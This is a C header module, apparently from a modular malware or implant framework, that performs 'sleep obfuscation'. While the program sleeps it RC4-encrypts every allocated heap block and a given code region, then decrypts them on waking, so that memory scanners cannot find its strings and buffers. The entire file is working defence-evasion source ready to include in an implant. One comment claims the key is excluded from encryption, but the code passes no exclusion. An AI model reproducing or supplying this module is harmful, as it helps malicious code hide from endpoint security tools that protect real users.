// chunk: evasion/sleep_heap_encrypt
// depends: (none)
// provides: ekko_sleep
// headers: windows.h
// risk: low
// note: Heap encryption during sleep — walks process heap with HeapWalk(), RC4-encrypts all committed blocks plus the code region, calls Sleep(), then decrypts everything on wake. Protects heap-allocated strings/buffers that memory scanners look for. No ROP or APC needed.

#ifndef CHUNK_SLEEP_HEAP_ENCRYPT
#define CHUNK_SLEEP_HEAP_ENCRYPT

typedef NTSTATUS (NTAPI *pfnSystemFunction032_heap)(
    struct { ULONG Length; ULONG MaximumLength; PUCHAR Buffer; } *data,
    struct { ULONG Length; ULONG MaximumLength; PUCHAR Buffer; } *key
);

static volatile int g_heap_encrypt_initialized = 0;
static pfnSystemFunction032_heap g_heap_SF032 = NULL;

static int heap_encrypt_init(void) {
    if (g_heap_encrypt_initialized) return 1;

    HMODULE advapi = LoadLibraryA("advapi32.dll");
    if (!advapi) return 0;

    g_heap_SF032 = (pfnSystemFunction032_heap)GetProcAddress(advapi, "SystemFunction032");
    if (!g_heap_SF032) return 0;

    g_heap_encrypt_initialized = 1;
    return 1;
}

static void heap_crypt_region(BYTE *addr, DWORD size, BYTE *key, DWORD key_len) {
    struct { ULONG Length; ULONG MaximumLength; PUCHAR Buffer; } data_blob;
    struct { ULONG Length; ULONG MaximumLength; PUCHAR Buffer; } key_blob;

    data_blob.Buffer = addr;
    data_blob.Length = data_blob.MaximumLength = size;
    key_blob.Buffer = key;
    key_blob.Length = key_blob.MaximumLength = key_len;

    g_heap_SF032(&data_blob, &key_blob);
}

// Walk the process heap and RC4-encrypt/decrypt all busy blocks
static void heap_crypt_all_blocks(HANDLE heap, BYTE *key, DWORD key_len,
                                   BYTE *exclude_base, DWORD exclude_size) {
    PROCESS_HEAP_ENTRY entry;
    entry.lpData = NULL;

    HeapLock(heap);
    while (HeapWalk(heap, &entry)) {
        if (!(entry.wFlags & PROCESS_HEAP_ENTRY_BUSY))
            continue;
        if (entry.cbData < 16)
            continue;

        BYTE *block = (BYTE *)entry.lpData;
        DWORD block_size = entry.cbData;

        // Don't encrypt our own key/context or the exclude region
        if (exclude_base &&
            block >= exclude_base && block < exclude_base + exclude_size)
            continue;

        heap_crypt_region(block, block_size, key, key_len);
    }
    HeapUnlock(heap);
}

static void ekko_sleep(DWORD ms, BYTE *base, DWORD size) {
    if (!g_heap_encrypt_initialized && !heap_encrypt_init()) {
        Sleep(ms);
        return;
    }

    // Generate per-sleep random key
    BYTE key[16];
    DWORD tick = GetTickCount();
    for (int i = 0; i < 16; i++)
        key[i] = (BYTE)((tick >> (i % 4 * 8)) ^ (i * 0xE7 + 0x5A));

    HANDLE process_heap = GetProcessHeap();
    if (!process_heap) { Sleep(ms); return; }

    // Encrypt the code region if provided
    if (base && size > 0) {
        DWORD old;
        VirtualProtect(base, size, PAGE_READWRITE, &old);
        heap_crypt_region(base, size, key, sizeof(key));
    }

    // Encrypt all heap blocks (RC4 is symmetric — same call decrypts)
    heap_crypt_all_blocks(process_heap, key, sizeof(key), NULL, 0);

    // Sleep
    Sleep(ms);

    // Decrypt all heap blocks
    heap_crypt_all_blocks(process_heap, key, sizeof(key), NULL, 0);

    // Decrypt code region and restore protection
    if (base && size > 0) {
        heap_crypt_region(base, size, key, sizeof(key));
        DWORD dummy;
        VirtualProtect(base, size, PAGE_EXECUTE_READ, &dummy);
    }

    SecureZeroMemory(key, sizeof(key));
}

#endif
